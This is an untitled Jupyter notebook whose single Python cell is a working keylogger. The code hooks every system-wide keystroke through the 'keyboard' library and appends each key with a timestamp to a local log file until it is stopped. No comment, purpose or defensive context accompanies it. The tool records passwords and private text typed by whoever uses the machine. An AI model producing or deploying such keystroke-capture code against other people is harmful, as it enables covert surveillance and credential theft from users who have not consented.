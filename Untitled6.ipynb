{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c812e250",
   "metadata": {},
   "outputs": [],
   "source": [
    "import keyboard\n",
    "import datetime\n",
    "\n",
    "\n",
    "log_file_name = \"keylog\" + str(datetime.datetime.now()) + \".txt\"\n",
    "log_file = open(log_file_name, \"w\")\n",
    "\n",
    "\n",
    "def on_key_event(event):\n",
    " \n",
    "    timestamp = datetime.datetime.now()\n",
    "    key_name = event.name\n",
    "\n",
    "   \n",
    "    log_file.write(str(timestamp) + \" \" + key_name + \"\\n\")\n",
    "\n",
    "\n",
    "keyboard.hook(on_key_event)\n",
    "\n",
    "keyboard.wait()\n",
    "\n",
    "log_file.close()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
